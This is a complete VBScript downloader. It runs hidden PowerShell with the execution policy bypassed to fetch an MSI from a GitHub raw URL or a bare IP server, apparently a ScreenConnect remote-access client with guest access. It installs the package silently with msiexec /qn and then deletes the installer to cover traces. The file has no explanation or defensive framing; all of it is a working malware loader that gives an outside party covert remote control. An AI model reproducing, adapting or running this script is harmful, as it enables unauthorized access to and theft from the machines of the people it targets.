' ================== CONFIG ==================
Dim PACKAGE_URLS, TEMP_PATH, TEMP_DIR

PACKAGE_URLS = Array( _
    "https://raw.githubusercontent.com/lordbacklink/Screen-01/refs/heads/main/1.msi", _
    "http://103.215.0.12:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest", _
    " http://103.215.0.12:8040/Bin/1.msi" _
)

TEMP_DIR  = "C:\Temp"
TEMP_PATH = TEMP_DIR & "\sc.msi"

' ================== OBJECTS ==================
Dim objShell, objFSO, intReturn
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

' ================== CREATE TEMP DIR ==================
If Not objFSO.FolderExists(TEMP_DIR) Then
    objFSO.CreateFolder TEMP_DIR
End If

' ================== CLEAN OLD FILES ==================
Dim oldFiles, f
oldFiles = Array(TEMP_PATH)

For Each f In oldFiles
    If objFSO.FileExists(f) Then
        objFSO.DeleteFile f, True
    End If
Next

' ================== DOWNLOAD FROM MULTIPLE URLS ==================
Dim url, success
success = False

For Each url In PACKAGE_URLS

    Dim downloadCmd
    downloadCmd = _
        "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
        """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
        "try {(New-Object Net.WebClient).DownloadFile('" & url & "','" & TEMP_PATH & "')} catch {}"""

    objShell.Run downloadCmd, 0, True

    ' چک کن دانلود شد یا نه
    If objFSO.FileExists(TEMP_PATH) Then
        success = True
        Exit For
    End If

Next

If Not success Then
    WScript.Quit 1
End If

' ================== INSTALL MSI ==================
Dim installCmd
installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"

objShell.Run installCmd, 0, True

' ================== CLEANUP ==================
If objFSO.FileExists(TEMP_PATH) Then
    objFSO.DeleteFile TEMP_PATH, True
End If
